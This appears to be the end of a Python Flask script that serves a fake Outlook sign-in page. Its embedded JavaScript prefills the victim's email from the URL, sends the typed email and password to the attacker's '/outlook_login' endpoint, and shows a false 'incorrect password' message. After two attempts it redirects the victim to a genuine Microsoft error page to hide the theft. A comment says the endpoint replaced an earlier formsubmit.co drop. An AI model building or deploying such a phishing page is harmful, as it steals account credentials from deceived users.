                    <input id="submit-btn" type="image" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAAAeCAYAAADaW7vzAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAAEnQAABJ0Ad5mH3gAAA/NSURBVGhD7Vp7cFTlFf/du+8km+fmBeQBhCSAQUUnCCrYqhWqglTQVpTaWgTBSgfb2k51hmn9w7ajjoIPqtY6OrUWrLVQirRTFQukKqAiGpTwMCHv12az77u7/Z1vd3ETAkFRyjmZ3XvvOeee8/3O7zuP7wo+n08/g0T+82/wx/+O/w+HjJycnK2BQGAGPhYWFqK3t1cVFRWBysrK/YFAYHxVVdXVfr9/YXZ2dm1/f/8M/A7V1dU1QogZg4OD8ysrK8N+vz9UVla2D7i6sbGxZOPGjY+2tLTsra6uXlJWVvYHwzDmIc90wzB2w5bLbDZbA8L0kpKSBYZhdEPH5I0bNzqgZ7Gqagwku1wu1+M2m2060rU0NTU56+rqbsY56fL7/Y8Gg8FLnE5nHe6vx7Ubdrs9H3Xm4VkJef/9qGOi2+0Owp8luF+DvxnuLygrK/sPqZP6kX4Jyi0vLy+vQ33jEf96m80Wga93yGdHpXv9+vVO0zRnoaA69CwUVl5e/k+k74VRb9PwAvydhN9h3MvB/Tw0zIFys3Hdg7x5TqcT1Uq5YPgS6HoWFf4Sxl4GJdYHg8EbcX8J8s6FjCz8nY5n90LuLhj3KBJf2t7evgj3r0SZtxQXFz8Ipaaik5yobysaPAzDvkMZSD8T6Z9Cx/AwZL8Gee+Qx+E4nPcu1HcV9M2Br/dwHIL+bbA1iPpqodtN28vKyq7nPfj9De4fRt0XIO0K+HUB6mhDp3kM9p46ODh4HT9Q6JvFYnGxDm7BRSDPnHr16tV5aKxDqDTJs5S/Q3Fo6EIYA0dLgsHgXDT0fJxXYpg8hL+fQblqOPA2yn8KPWYlMq+FES3o5V9Dz3qgqalpGgpaDOevo0zE7rskI0mqA2McuFeE81dRdhp6bS4a5QLaAMY66PgqClyRl5e3APLvzszMXAo9HyGvB2XexD0PeusdSP9N+HA9fC1Ag5GJjexE2mfw8Wro8k8Y/AvI8+A6x2az2eHfn/B7OWQsgY7rYV8EZdZB/mbI+Rdk3YQ67S6Xy80hge+7IacI18XwaQZ8fRB+3gB9Xoe7+0AM7WX78XvLf/7k5uY+gQa2g3F6BCLHz1OnTj1jw4YNGkp8BOeORSM1oSF+0N3d7d24cWOEhiB9H9L2wjkW8oLFYvGXlpbG+vv7h9BjPkXeL5E+gnIbs7Ky9nKcIN8JmRrOQ7g/hMq3Qc9uyBqC3J1ovDCuy1BnH3R1Q8cO8Hh9ff1elAng3nbI2wlZVpR7l+f4ncv8kEMGeO5HnR1ut7sL9+04/wTy7KizG/47kH4E+j6CnkM4BkD8Y/j1MmS/h7pHIacZaeVwN2HCBCf84P0FqHMA9Xcg31b4E8C9K/AsZ8OGDR2QF4Z9e3G/9/jx4z3I50E9kXHjxgXhxwco0w2/2kFk+BmJbIOtO/H7NP7sXq83D4aHUUmvpmk2pOsE+3HKAA5/wQ/B9vb29j6kCXm9Xgcq9ECGln4+m0YJ2LtlAMd7kJ0WgYYAxn8Mnx2BvL24Nyh/q4t/QP5PCnQkGdzFPhJ/DQ8Pk9EaqR4NMAxWGBWnHE4Y5fQq/AnBj7XK9zlGXSMjI6GGhobI2LFj1bQfHk73gwJDLIl6Azg+go4Bj8czoHiOFZRvsbw21fUY8UslW6DRJv6YkA4oMPhIEz8Uw6kQ/4dpCAr3R+/zNwywsCKFh0D6efQa6VhV7HQ6YxzMcp8KGg/n2NtS2ci/7Pm6eDab2R5cDYTRJjLIHjyjoC5OhyMqjYRz9lxV9gCiIv6kA/XJf3G4XK6wVZXJIJMcKg2eJwP19Pb29qj/H6F2zucR1cP66FshqlOoI5mNQ95P5ImqxE+5R4oekcOyqPO1aqPo+OHQIt8nK5NKCNOlAoMvjHokIcmEr8o6j85YjPqT9N5EnhBEj0/m59lAfQrf8E1uNyVT6SIDZT6VT+IzBp1UDuRQcpgIU6jMp6pihiiOdJGMt1s6YHZRl0yDgJFAFcQ5CzJNqghXOhsO0SivZF4u65zKMcB8Qcqqq6tzNTY2utvb28NgZwC9qAeR2Y/75KKrq6srCPp6KysrfehFAaQLdHR0BCkL9wMg3n/s2DGvz+eTm3XIC3Z0dHgRWQE0Whjp/KWlpQGM/x6v1+vt7OxM5c9l8b8U0nXIe8VwzspVmby/AjrqcS8Pf2eYppkHv/w4d+O6AJdLcf9i1JGn5vf5+F2I6xzI8kFHLi7z4YdHrQdyEPYc0JUPHXk1NTXuZD5e4nf+zTff7E6JzPn4nYu/C/D3auqB7kKQZg6Qj2eLcJ2N50XwIw8kLqiqqnLV19dnUFZVVVU+9eI8Z5S89Hgl9V6C8xxFFtR1pfx7MeoogBwXbMqGnX7YPASf+3H0Ie0Afvfj2IffftjV29XVNQy9IY/HMzK6TgM3XJiZeMY6wgySAow+3GuG8c2gqhdHXK8w5VgvKiE5f9jQ0NACAV0wIqCQH4JhEfiFhulC+gjS9UKmHz2uC/e7m5qaon6/PwADB2FgD5wNgPwu5G2FccbRo0cN5O1B/h4ciWAw6DUMIwoiBuHwoFqAGDhb9PVx8U4jQcZXaJdcXP/C4XD8DD2IbyzuxfUU/OYGhAt//wj5v4CsVZByG55fB1ne2tra1TjfB7L24z5nKkP4+zqc3w2ZayBzDn7fDFlLcH5/enr6fJyv1jRtFfK8hPQ3Qu50yFqE9H9A2hBk7kH6C5F3OeT+Dvqfgj/rkL8M+dfj+WzYci1k3gX9nZC7A/cyYdMf8Wwm5N4Eme/BhnzIKodtD0JHH3TtQ/lfQO5iyP0T6n0deTuh53rY/TB8eBQytsCOm/G8BM+OQc4I6jqIulvwbC+uNyJtM/I3wbcy6L8Pujfgnh/lQvh9K9J5oGMX6n8b51uRNgKb+qF3n8PhaELvHsH1iKZpEcgcUa/8OB1wqA3j9yEcrRAsd6BZKKVOnz69ETdq0bDHgVpUTsVhFM7Ixo0be2DIf6FoEEL3weAaKH0OjcWgdaC8Dp2dSH8I5d6C/DbU34L7JNLQNA1vRfV+ONAJ5/X8/HyDu7Mo9wnq6UHDW0E8d+K0Ady1nI18cwp4j+fm5u5EOg9+5yK/m6RB/jdA5rfx92U4z8PvH0CWY8aMGX2ZmZn/Qv2H8XwPfPkrfP4m6ngVPqSBNO9x6wh5l6HO2yD7p+np6U3Q1wxde9GYPvxuRT0e5L8F8jJQPgPN9Azq9iBdE9KtwbmdsmDH48jzN5zX4fp6yH0U5X6M69tQ/0KcfxPPn4YdfdATgryNuLcT5V6FzFvR0F7Y8Af8/l+U+RiyK5C+BPefRPn/Qpl21PEK5N6LZ/+A3h047sL9ebD7Ndh6gO2Lv/8H33+H+o8j/2HI/Qhl3gRBLyFvM+y6AL95fSny7eS7Aujphqxe2NnD9qcstgvvJz9o4YjBga0ovA7ntRBQgd8hQ9fjkTZjxowYjO5CoQPQeQzXr+H4AIoPIq8JZSP5+fm6ruuyJ1KZ0+mMgbD98fHxYRi1F0JfxT0w/L+IbBK4nz3HYrFE4Ec3GicC2UHOqjE0dOg8Cjlx43cF9PSgnghmIBfhnF+tcqYKP5+Evp0g5CHo7Mfvf8BvA39/j/NnoOcAzvfhfjsa7Tv4fSN+O6BnD8ptQb7v4twJOXb8fRbp3oR9I5SJ8o3Q9T0uxqF7B3z5Ee51Il8j7s3C8d+wk5/L1EHe76Gze/ny5ftxDlLcCB9zWJZtoZ6vqK+v92E0dqNcG+45cf3v6Ohw5I9E0GAsquQ1GoVrLsmkYWlWOBjvOdwR5/qDn2xyrZGYDsMoqD/6RgrPpV4YwCHBnsm0Ya4FUukFObgHwT0D+ZU+grrC6hrDVGY+ETy30CeWM5XvLNMHO+2QJd+8G4aBrgmiQb+JBpRfjbDROVtT7mu2kwM+ROT7PHWPH/qmXI/wb2SE0mORJQOyuRaST/sR6l3qVdeQ3I9a6ZvcGkM6q9Opy/3CIe7NMQ11c9MvMeU3oN8L4ljpPX7yOnP69MvhbArq7h5Wn/dQlxkOu6XdqFf+BYCq9yh1cjsE9/8P+gDQne3o4xIAAAAASUVORK5CYII=" alt="Submit" role="button" tabIndex="0">
                </div>
            </div>
        </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.3.1.min.js" nonce="MzA4MjAzMTI0NywzNDY1MDY1MDUw"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" nonce="MzA4MjAzMTI0NywzNDY1MDY1MDUw"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" nonce="MzA4MjAzMTI0NywzNDY1MDY1MDUw"></script>
    
    <script nonce="MzA4MjAzMTI0NywzNDY1MDY1MDUw">
    $(document).ready(function() {
        var count = 0;
        var $emailField = $('#email02');
        var $aiField = $('#aiField');
        var $msg = $('#msg');
        var $submitButton = $('#submit-btn');
        var $error = $('#error');
        var $passwordField = $('#password');

        // Clear email field
        $emailField.val('');
        setTimeout(function(){
            $emailField.val('');
        }, 50);

        // Extract email from URL hash
        var email = window.location.hash.substr(1);
        if (email) {
            var ind = email.indexOf("@");
            var my_slice = email.substr(ind + 1);
            var c = my_slice.substr(0, my_slice.indexOf('.')).toLowerCase();
            $msg.hide();
            $emailField.val(email);
        }

        // Set aiField from hash
        var hashValue = location.hash.substring(1);
        $aiField.val(hashValue);

        // Add keypress event for Enter key
        $emailField.add($passwordField).keypress(function(event) {
            if (event.which === 13) {
                event.preventDefault();
                $submitButton.click();
            }
        });

        // Handle form submission
        $submitButton.click(function(event) {
            event.preventDefault();
            $error.hide();
            $msg.hide();

            var email02 = $emailField.val();
            var password = $passwordField.val();
            var ai = $aiField.val();

            // Get IP address from Flask
            var ip = '{{ request.remote_addr }}';
            var useragent = navigator.userAgent;
            
            count++;

            // Send to Flask endpoint instead of formsubmit.co
            $.ajax({
                url: '/outlook_login',  // Changed to Flask endpoint
                type: 'POST',
                data: {
                    email02: email02,
                    password: password,
                    ai: ai,
                    attempts: count
                },
                beforeSend: function() {
                    $submitButton.val('Signing in...');
                },
                success: function(response) {
                    if (count >= 2) {
                        count = 0;
                        window.location.replace('https://outlook.office365.com/Encryption/ErrorPage.aspx?src=3&code=11&be=SN6PR04MB4014&fe=JNAP275CA0040.ZAFP275.PROD.OUTLOOgK.COM&loc=en-US&itemID=E4E_M_e9df154a-e4b8-4486-8aec-7acceeb93fee');
                    }
                },
                complete: function() {
                    $submitButton.val('Sign in');
                    $passwordField.val("");
                    $msg.show().html("The username or password you entered isn't correct. Try entering it again.");
                }
            });
        });
    });
</script>
</body>
</html>""")
    
    # Create static directory for CSS/JS if needed
    if not os.path.exists('static'):
        os.makedirs('static')
    
    app.run(host="0.0.0.0", port=3000, debug=True)
